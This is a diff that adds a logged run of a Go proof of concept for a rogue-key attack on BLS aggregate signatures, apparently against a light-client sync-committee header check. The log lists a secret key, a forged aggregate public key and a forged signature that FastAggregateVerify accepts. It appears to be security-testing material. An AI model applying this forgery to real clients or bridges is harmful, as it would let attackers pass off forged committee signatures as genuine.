@@ -1,0 +1,17 @@
+# go run . in a module outside the repository (go.mod: rogue-key.go.mod.txt, source: rogue-key.go.txt), GOTOOLCHAIN=local GOFLAGS=-mod=mod GOPROXY=off, 2026-11-03
+# go version: go version go1.23.6 linux/amd64
+fork_version            06000000
+genesis_validators_root 4b363db94e286120d76eb905340fdd4e54bfe9f06bf33ff6cf5ad27f511bfe95
+attested_header_root    fca2bad46e3e5260228fec16653435a60c133c4a2bfa02cc443c7923de25f2d2
+domain                  0700000082fae541f8a3db43adb5e7997ac5f562cf682ce6bc41b8ec28ba1a07
+signing_root            d9477453c743e2487cdb8508fa9e06e5ef2a1d638df806f5f0383dc80e3d8904
+DST                     BLS_SIG_BLS12381G2_XMD:SHA-256_SSWU_RO_POP_
+secret_key (Fr)         1203f71721b98c930e0732de970efa733b614c21772f1f7fb3860673b5a16f93
+rogue_apk (96 B X||Y)   132c27acf24e7c3878ec977292d6978be08aa683928fcc90bba18ec8ea250ab411c7a3d6ff4f6f58ed5784c23f218d7f1059ce162cb02544a8de10dc764d46ce4da50898fc3109d2ec8ad3cfb4b10d15216064d6b34a9068289c795edd938f32
+rogue_apk compressed    b32c27acf24e7c3878ec977292d6978be08aa683928fcc90bba18ec8ea250ab411c7a3d6ff4f6f58ed5784c23f218d7f
+rogue_signature (96 B)  a1a130555c63ac35d323f95f3c3460c749c91d0ff1920c7f32f78c79dc8a46d7085ac063ff75a847f976a14f9452c4fd027b9a6d5a5a6c0706200aec5c265c1a0a2476797994d8729207c731ec75085b1c8601187c067949f210503b28edce14
+FastAggregateVerify(rogue_apk, signing_root, rogue_signature) = true (err <nil>)
+FastAggregateVerify(real_apk, signing_root, real_signature)   = true
+FastAggregateVerify(real_apk, signing_root, rogue_signature)  = false
+FastAggregateVerify(rogue_apk, signing_root, real_signature)  = false
+rogue_apk == real_apk: false
